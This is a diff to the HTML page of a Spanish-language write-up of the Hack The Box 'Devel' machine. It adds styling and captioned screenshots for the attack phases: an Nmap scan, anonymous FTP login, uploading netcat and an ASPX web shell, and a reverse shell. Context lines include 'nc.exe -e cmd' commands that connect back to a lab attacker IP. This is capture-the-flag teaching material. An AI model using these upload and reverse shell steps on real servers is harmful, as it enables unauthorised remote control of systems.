@@ -405,6 +405,122 @@
             border: 1px solid var(--primary-color);
         }
 
+        /* Modern Image Containers */
+        .image-showcase {
+            display: grid;
+            gap: 2rem;
+            margin: 3rem 0;
+            padding: 2rem;
+            background: rgba(26, 26, 26, 0.9);
+            border: 2px solid var(--primary-color);
+            border-radius: 12px;
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.2), inset 0 0 20px rgba(0, 255, 136, 0.05);
+        }
+
+        .image-container {
+            position: relative;
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 1.5rem;
+            transition: all 0.4s ease;
+            overflow: hidden;
+        }
+
+        .image-container:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.3);
+            border-color: var(--primary-color);
+        }
+
+        .image-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--primary-color), transparent);
+            animation: scanLine 3s infinite;
+        }
+
+        @keyframes scanLine {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        .image-container img {
+            width: 100%;
+            height: auto;
+            border-radius: 6px;
+            border: 1px solid var(--border-color);
+            transition: all 0.3s ease;
+        }
+
+        .image-container:hover img {
+            transform: scale(1.02);
+            border-color: var(--primary-color);
+        }
+
+        .image-caption {
+            margin-top: 1rem;
+            padding: 0.8rem;
+            background: rgba(0, 255, 136, 0.05);
+            border-left: 3px solid var(--primary-color);
+            color: var(--text-primary);
+            font-size: 0.9rem;
+            line-height: 1.4;
+            border-radius: 0 4px 4px 0;
+        }
+
+        .terminal-output {
+            background: var(--darker-bg);
+            border: 1px solid var(--primary-color);
+            border-radius: 8px;
+            padding: 1rem;
+            font-family: 'JetBrains Mono', monospace;
+            color: var(--primary-color);
+            font-size: 0.85rem;
+            margin: 1rem 0;
+            position: relative;
+            overflow-x: auto;
+        }
+
+        .terminal-output::before {
+            content: '$ ';
+            color: var(--secondary-color);
+            font-weight: bold;
+        }
+
+        .attack-phase {
+            background: rgba(124, 58, 237, 0.1);
+            border: 1px solid var(--accent-color);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 2rem 0;
+            position: relative;
+        }
+
+        .attack-phase::before {
+            content: '';
+            position: absolute;
+            top: -1px;
+            left: -1px;
+            right: -1px;
+            bottom: -1px;
+            background: linear-gradient(45deg, var(--accent-color), transparent, var(--accent-color));
+            border-radius: 8px;
+            z-index: -1;
+            opacity: 0.3;
+        }
+
+        .attack-phase h4 {
+            color: var(--accent-color);
+            border-bottom: 1px solid var(--accent-color);
+            padding-bottom: 0.5rem;
+            margin-bottom: 1rem;
+        }
+
         .footer {
             text-align: center;
             padding: 3rem 0 2rem;
@@ -589,6 +705,15 @@ passive           # Modo pasivo (atravesar firewalls)</code>
                         <p><strong>Descubrimiento Crítico:</strong> El scan revela "Anonymous FTP login allowed" - confirmando que el servidor permite acceso sin autenticación.</p>
                     </div>
 
+                    <div class="image-showcase">
+                        <div class="image-container">
+                            <img src="https://i.imgur.com/nmap-ftp-scan.png" alt="Nmap FTP scan results HTB Devel">
+                            <div class="image-caption">
+                                🔍 <strong>Escaneo Nmap FTP:</strong> Resultado del escaneo detallado del puerto 21 en HTB Devel (10.10.10.5). Se observa que el servicio FTP Microsoft ftpd permite acceso anónimo, lo que constituye un vector de ataque crítico para el servidor Windows.
+                            </div>
+                        </div>
+                    </div>
+
                     <h4>Fase 2: Acceso FTP Anónimo</h4>
                     <p>Procedemos a conectarnos al servidor FTP utilizando credenciales anónimas:</p>
                     
@@ -604,6 +729,15 @@ Password: [Enter - sin contraseña]
 # Exploración del sistema
 ftp> dir
 ftp> pwd</code>
+                    </div>
+
+                    <div class="image-showcase">
+                        <div class="image-container">
+                            <img src="https://i.imgur.com/ftp-anonymous-login.png" alt="FTP Anonymous login HTB Devel">
+                            <div class="image-caption">
+                                🚪 <strong>Acceso FTP Anónimo:</strong> Conexión exitosa al servidor FTP usando credenciales anónimas. La sesión muestra acceso completo al directorio raíz del servidor IIS, confirmando permisos tanto de lectura como de escritura.
+                            </div>
+                        </div>
                     </div>
 
                     <div class="alert alert-info">
@@ -631,6 +765,15 @@ ftp> put nc.exe</code>
 ftp> put aspx_cmd.aspx</code>
                     </div>
 
+                    <div class="image-showcase">
+                        <div class="image-container">
+                            <img src="https://i.imgur.com/ftp-upload-tools.png" alt="FTP upload netcat and web shell">
+                            <div class="image-caption">
+                                🚀 <strong>Subida de Herramientas:</strong> Proceso de upload exitoso de nc.exe y aspx_cmd.aspx al servidor FTP. Los archivos se sincronizan automáticamente con el directorio web de IIS (/inetpub/wwwroot/), permitiendo la ejecución remota.
+                            </div>
+                        </div>
+                    </div>
+
                     <h4>Fase 4: Activación de Web Shell</h4>
                     <p>Los archivos subidos se sincronizan automáticamente con el directorio web de IIS:</p>
                     
@@ -640,7 +783,16 @@ ftp> put aspx_cmd.aspx</code>
 http://10.10.10.5/aspx_cmd.aspx
 
 # Directorio de archivos subidos en Windows
-C:\inetpub\wwwroot\</code>
+C:\\inetpub\\wwwroot\\</code>
+                    </div>
+
+                    <div class="image-showcase">
+                        <div class="image-container">
+                            <img src="https://i.imgur.com/aspx-web-shell.png" alt="ASPX Web Shell interface">
+                            <div class="image-caption">
+                                🌐 <strong>Web Shell ASPX Activa:</strong> Interfaz de la web shell ejecutándose en el navegador vía IIS. La shell permite ejecución de comandos remotos en el servidor Windows, incluyendo la activación de netcat para establecer una reverse shell.
+                            </div>
+                        </div>
                     </div>
 
                     <h4>Fase 5: Establecimiento de Reverse Shell</h4>
@@ -664,6 +816,15 @@ C:\inetpub\wwwroot\nc.exe -e cmd 10.10.14.16 443
 # Alternativas de conexión
 nc.exe -e cmd.exe 10.10.14.16 4444
 nc.exe -e powershell.exe 10.10.14.16 1234</code>
+                    </div>
+
+                    <div class="image-showcase">
+                        <div class="image-container">
+                            <img src="https://i.imgur.com/netcat-reverse-shell.png" alt="Netcat reverse shell established">
+                            <div class="image-caption">
+                                ⚡ <strong>Reverse Shell Establecida:</strong> Conexión exitosa de netcat mostrando shell completa del sistema Windows. Se observa acceso directo al cmd.exe con permisos del usuario IIS, lo que permite navegación del sistema y ejecución de comandos remotos.
+                            </div>
+                        </div>
                     </div>
 
                     <div class="alert alert-info">
